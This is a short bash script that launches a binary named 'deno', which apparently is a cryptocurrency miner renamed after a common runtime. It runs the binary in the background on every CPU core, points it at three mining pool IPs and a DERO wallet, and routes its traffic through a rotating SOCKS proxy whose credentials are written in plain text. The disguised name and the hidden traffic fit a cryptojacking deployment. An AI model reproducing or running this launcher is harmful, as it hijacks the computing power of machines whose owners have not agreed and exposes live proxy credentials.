#!/bin/bash

chmod +x deno
nohup ./deno -r 159.65.131.73:443 -r1 138.68.182.128:443 -r2 157.245.94.101:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.STR -m $(nproc --all) -p rpc -k -1 -sock-address p.webshare.io:80 -sock-auth k78sasd65jsz3h-rotate:p09jd482mry6s -report-realtime-hashrate
